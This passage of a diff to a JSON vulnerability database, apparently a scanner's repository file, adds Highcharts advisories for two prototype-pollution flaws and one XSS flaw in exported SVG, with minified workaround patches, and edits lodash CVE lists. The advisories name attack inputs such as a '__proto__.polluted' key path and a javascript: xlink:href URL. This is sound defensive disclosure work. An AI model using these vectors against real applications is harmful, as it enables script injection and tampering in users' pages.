[installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+          "info": [
+            "https://github.com/highcharts/highcharts/security/advisories/GHSA-65hg-cf3f-5m39",
+            "https://github.com/highcharts/highcharts/commit/abde7c576793bf50b0e0636e59b49630de6dd0d5",
+            "https://github.com/highcharts/highcharts/releases/tag/v13.1.0"
+          ]
+        },
+        {
+          "atOrAbove": "13.0.0",
+          "below": "13.1.0",
+          "severity": "high",
+          "cwe": [
+            "CWE-1321"
+          ],
+          "identifiers": {
+            "summary": "Highcharts: series column construction writes to Object.prototype",
+            "githubID": "GHSA-gfvx-2c2g-38wq",
+            "CVE": [
+              "CVE-2026-118249"
+            ]
+          },
+          "details": "### Impact\nWhen series columns are built from point objects, the point option keys are used directly as data column ids, so the write that populates a column reaches `Object.prototype` and the `Object` constructor. Keys named `__proto__` and `constructor` survive `JSON.parse` as own enumerable properties, so an attacker who controls the point objects can set integer-keyed properties on `Object.prototype`, one per point index, to values of their choosing. Named properties cannot be reached this way. The integer keys still affect every object in the page: reading an out-of-range index on any array or plain object returns the attacker's value, and `for...in` over any object yields the injected keys, so unrelated code can take branches it should not using attacker-supplied data, and rendering can fail as a side effect. The properties remain in place once the chart has been built, and no user interaction is required beyond rendering the chart.\n\nConsequences beyond disruption depend on the consuming application.\n\n### Workarounds\nDrop-in fix - for any versions affected (6.1.0-13.0.2).\nAdd the below IIFE to run after Highcharts is loaded.\n\n```javascript\n;!function(t){if(t&&t.Point&&!t.Point.prototype.protoPollutionPatched){var o=t.Point.prototype,r=o.optionsToObject,e=o.setNestedProperty,n=Object.prototype.hasOwnProperty;o.optionsToObject=function(t){if(t&&\"object\"==typeof t&&!Array.isArray(t)&&(n.call(t,\"__proto__\")||n.call(t,\"constructor\"))){var o={};for(var e in t)n.call(t,e)&&!c(e)&&(o[e]=t[e]);t=o}return r.call(this,t)},o.setNestedProperty=function(t,o,r){return String(r).split(\".\").some(c)?t:e.call(this,t,o,r)},o.protoPollutionPatched=!0}function c(t){return\"__proto__\"===t||\"constructor\"===t}}(Highcharts);\n```\n\n[Live demo & testing](https://jsfiddle.net/BlackLabel/nopc6vhj/)\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@13.1.0`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.0/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+          "info": [
+            "https://github.com/highcharts/highcharts/security/advisories/GHSA-gfvx-2c2g-38wq",
+            "https://github.com/highcharts/highcharts/pull/25321",
+            "https://github.com/highcharts/highcharts/commit/d3357705c8f348904441327e32f50ab528c3a205",
+            "https://github.com/highcharts/highcharts/releases/tag/v13.1.0"
+          ]
+        },
+        {
+          "atOrAbove": "13.0.0",
+          "below": "13.1.0",
+          "severity": "high",
+          "cwe": [
+            "CWE-1321"
+          ],
+          "identifiers": {
+            "summary": "Highcharts: dotted series.keys paths write to Object.prototype",
+            "githubID": "GHSA-rmqc-xvr3-v46c",
+            "CVE": [
+              "CVE-2026-118250"
+            ]
+          },
+          "details": "### Impact\nA dot-separated key path taken from `series.keys` is followed without filtering the individual segments. An attacker who controls `series.keys` and the matching point data can use a path such as `__proto__.polluted` to set arbitrary properties on `Object.prototype`. The resulting properties are visible to all JavaScript running in the page, not only to the chart. No user interaction is required beyond rendering the chart.\n\nThe injected properties are inert until other code on the page reads them, so consequences depend on the consuming application.\n\n### Workarounds\nDrop-in fix - for any versions affected (6.1.0-13.0.2). Add the below IIFE to run after Highcharts is loaded.\n\n```javascript\n((H)=>{const X = H.isObject;H.Point.prototype.setNestedProperty = function setNestedProperty(t,e,i){let s=i.split(\".\");return s.some(t=>\"__proto__\"===t||\"constructor\"===t)||s.reduce(function(t,i,s,o){let r=o.length-1===s;return t[i]=r?e:X(t[i],!0)?t[i]:{},t[i]},t),t};})(Highcharts);\n```\n\n[Live demo & testing](https://jsfiddle.net/BlackLabel/z3rbtm7u/)\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@13.1.1`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.1/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+          "info": [
+            "https://github.com/highcharts/highcharts/security/advisories/GHSA-rmqc-xvr3-v46c",
+            "https://github.com/highcharts/highcharts/pull/25313",
+            "https://github.com/highcharts/highcharts/commit/fd4ee8140732618bbe71295aba55398fb1f8fa9e",
+            "https://github.com/highcharts/highcharts/releases/tag/v13.1.0"
+          ]
+        },
+        {
+          "atOrAbove": "13.0.0",
+          "below": "13.1.1",
+          "severity": "high",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "Highcharts Core: `javascript:` URL in an `xlink:href` attribute survives text filtering and reaches exported charts",
+            "githubID": "GHSA-mw4f-gj5x-6xr4",
+            "CVE": [
+              "CVE-2026-116796"
+            ]
+          },
+          "details": "### Impact\nThe filter applied to markup in text options checks `href`, `src` and a few similar attributes against an allowed-scheme list, but accepts `xlink:href` without that check, so an SVG anchor whose `xlink:href` is a `javascript:` URL passes the filter, whether or not the option is rendered with `useHTML`. In the live page the attribute is written without the XLink namespace, so browsers do not treat the anchor as a link there.\n\nThe attribute is preserved verbatim in the chart's serialised output: the SVG produced by the exporting module, including the default SVG download, declares the XLink namespace and contains the anchor, and so does the markup of the chart container. Any document that parses that output again, such as the downloaded SVG opened in a browser or a page that inlines exported or server-rendered chart markup, then holds a working link, and an attacker who controls the chart configuration can thereby run script in the origin of that document when a user activates the link.\n\nExploitation requires that untrusted data reach a text option such as the title, that the chart be exported or its markup be serialised and parsed again, and that a user activate the link.\n\n### Workarounds\nDrop-in fix for all affected versions (10.3.2 - 13.1.0).\n\nAdd the below IIFE to run after Highcharts is loaded, before creating a chart.\n\n```\n!function(t){var e=t&&t.AST;if(e&&\"function\"==typeof e.filterUserAttributes&&!e.xlinkHrefPatched){var r=e.filterUserAttributes,n=Object.prototype.hasOwnProperty;e.filterUserAttributes=function(t){return t&&n.call(t,\"xlink:href\")&&!o(t[\"xlink:href\"])&&delete t[\"xlink:href\"],r.call(this,t)},e.xlinkHrefPatched=!0}function o(t){var r=e.allowedReferences||[\"https://\",\"http://\",\"mailto:\",\"/\",\"../\",\"./\",\"#\"];return\"string\"==typeof t&&r.some(function(e){return 0===t.indexOf(e)})}}(Highcharts);\n```\n\n### Obtaining the patched version\nThe patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@13.1.1`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.1/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).",
+          "info": [
+            "https://github.com/highcharts/highcharts/security/advisories/GHSA-mw4f-gj5x-6xr4",
+            "https://github.com/highcharts/highcharts/commit/6cf359fb144aa51fdc105e2b9bbd013439b02c88",
+            "https://github.com/highcharts/highcharts/releases/tag/v13.1.1"
+          ]
         }
       ],
       "extractors": {
@@ -14799,8 +15667,7 @@
           "identifiers": {
             "summary": "Command Injection in lodash",
             "CVE": [
-              "CVE-2021-23337",
-              "CVE-2026-4800"
+              "CVE-2021-23337"
             ],
             "githubID": "GHSA-35jh-r3h4-6jhm"
           },
@@ -14873,8 +15740,7 @@
             "summary": "Lodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution via the _.unset and _.omit functions. An attacker can pass crafted paths to delete methods from global prototypes such as Object.prototype, though the issue only permits deletion and not overwriting of properties.",
             "githubID": "GHSA-xxjr-mmjv-4gpg",
             "CVE": [
-              "CVE-2025-13465",
-              "CVE-2026-2950"
+              "CVE-2025-13465"
             ]
           },
           "details": "### Impact\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.  \n\n### Patches\n\nThis issue is patched on 4.17.23.",
@@ -14894,7 +15760,6 @@
             "summary": "Lodash 4.17.23 and earlier are vulnerable to a prototype pollution bypass in _.unset and _.omit. The fix for CVE-2025-13465 only guards against string key members, so attackers can bypass it by passing array-wrapped path segments to delete properties from built-in prototypes including Object.prototype, Number.prototype, and String.prototype.",
             "githubID": "GHSA-f23m-r3pf-42rh",
             "CVE": [
-              "CVE-2025-13465",
               "CVE-2026-2950"
             ]
           },
@@ -14915,7 +15780,6 @@
             "summary": "Lodash _.template is vulnerable to code injection via unsanitized options.imports key names. Untrusted key names are passed to the Function() constructor sink without validation, and the use of assignInWith (which enumerates inherited properties) also means that pre-existing prototype pollution on Object.prototype can flow into the Function() sink and execute arbitrary code at template compilation time.",
             "githubID": "GHSA-r5fr-rjxr-66jc",
             "CVE": [
-              "CVE-2021-23337",
               "CVE-2026-4800"
             ]
           },
